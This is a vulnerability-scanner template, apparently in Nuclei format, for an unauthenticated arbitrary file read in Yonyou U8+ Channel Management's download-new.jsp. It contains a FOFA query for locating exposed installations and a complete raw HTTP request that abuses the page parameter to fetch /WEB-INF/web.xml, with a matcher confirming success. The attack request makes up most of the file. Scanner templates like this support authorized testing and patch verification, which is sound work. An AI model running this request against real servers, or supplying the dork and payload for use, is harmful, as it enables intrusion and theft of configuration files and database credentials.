id: Yonyou-U8-Channel-management-download-new-File-reading

info:
  name: 用友U8+渠道管理(高级版) download-new.jsp 任意文件读取
  author: HuanXiong
  severity: medium
  description: |-
    fofa："common/images/dot.gif" && (icon_hash="737647198" || icon_hash="84729000")
    用友U8+渠道管理(高级版) download-new.jsp 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  reference: |-
    -
  tags: File reading
  
http:
  - raw:
      - |-
        GET /business/common/download-new.jsp?filename=&page=/WEB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        
    matchers:
      - type: dsl
        name: 任意文件读取
        dsl:
          - 'status_code==200 && contains_all(body,"DingTalkPcLoginServlet")'
